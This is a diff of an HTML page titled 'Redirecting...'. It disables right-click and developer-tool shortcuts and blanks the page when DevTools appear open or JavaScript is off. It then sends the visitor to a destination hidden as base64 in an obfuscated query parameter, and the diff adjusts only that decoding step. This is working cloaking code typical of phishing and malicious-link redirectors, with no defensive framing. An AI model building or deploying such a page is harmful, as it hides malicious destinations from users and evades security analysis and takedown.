@@ -1,74 +1,65 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="UTF-8">
-  <title>Redirecting...</title>
+  <meta charset="UTF-8">
+  <title>Redirecting...</title>
 
-  <script>
-    // Disable right-click and inspect shortcuts
-    document.addEventListener('contextmenu', e => e.preventDefault());
-    document.onkeydown = function(e) {
-      if (
-        e.keyCode === 123 || // F12
-        (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || // Ctrl+Shift+I/J
-        (e.ctrlKey && (e.keyCode === 83 || e.keyCode === 85 || e.keyCode === 65)) // Ctrl+S/U/A
-      ) {
-        return false;
-      }
-    };
+  <script>
+    // Disable right-click and inspect shortcuts
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    document.onkeydown = function(e) {
+      if (
+        e.keyCode === 123 || // F12
+        (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || // Ctrl+Shift+I/J
+        (e.ctrlKey && (e.keyCode === 83 || e.keyCode === 85 || e.keyCode === 65)) // Ctrl+S/U/A
+      ) {
+        return false;
+      }
+    };
 
-    // Detect DevTools open
-    setInterval(function () {
-      if (window.outerWidth - window.innerWidth > 100 || window.outerHeight - window.innerHeight > 100) {
-        window.location.href = "about:blank";
-      }
-    }, 500);
-  </script>
+    // Optional DevTools detection
+    setInterval(function () {
+      if (window.outerWidth - window.innerWidth > 100 || window.outerHeight - window.innerHeight > 100) {
+        window.location.href = "about:blank";
+      }
+    }, 500);
+  </script>
 
-  <script>
-    window.onload = function () {
-      const params = new URLSearchParams(window.location.search);
-      let encodedValue = '';
+  <script>
+    window.onload = function () {
+      const params = new URLSearchParams(window.location.search);
+      let encodedValue = '';
 
-      for (const [key, value] of params.entries()) {
-        if (key.length === 2 && value.length > 6) {
-          // Remove first 3 and last 3 characters
-          const trimmed = value.substring(3, value.length - 3);
+      for (const [key, value] of params.entries()) {
+        if (key.length === 2 && value.length > 6) {
+          // Remove only the first 3 characters
+          encodedValue = value.substring(3);
+          break;
+        }
+      }
 
-          try {
-            // Decode URL-encoded base64
-            encodedValue = decodeURIComponent(trimmed);
-          } catch (e) {
-            window.location.href = 'about:blank';
-            return;
-          }
+      if (encodedValue) {
+        try {
+          const decodedURL = atob(encodedValue);
+          let finalURL = decodedURL;
 
-          break;
-        }
-      }
+          if (!/^https?:\/\//i.test(finalURL)) {
+            finalURL = 'https://' + finalURL;
+          }
 
-      if (encodedValue) {
-        try {
-          const decodedURL = atob(encodedValue);
-          let finalURL = decodedURL;
+          window.location.href = finalURL;
+        } catch (e) {
+          window.location.href = 'about:blank';
+        }
+      } else {
+        window.location.href = 'about:blank';
+      }
+    };
+  </script>
 
-          if (!/^https?:\/\//i.test(finalURL)) {
-            finalURL = 'https://' + finalURL;
-          }
-
-          window.location.href = finalURL;
-        } catch (e) {
-          window.location.href = 'about:blank';
-        }
-      } else {
-        window.location.href = 'about:blank';
-      }
-    };
-  </script>
-
-  <noscript>
-    <meta http-equiv="refresh" content="0;url=about:blank">
-  </noscript>
+  <noscript>
+    <meta http-equiv="refresh" content="0;url=about:blank">
+  </noscript>
 </head>
 <body>
 </body>
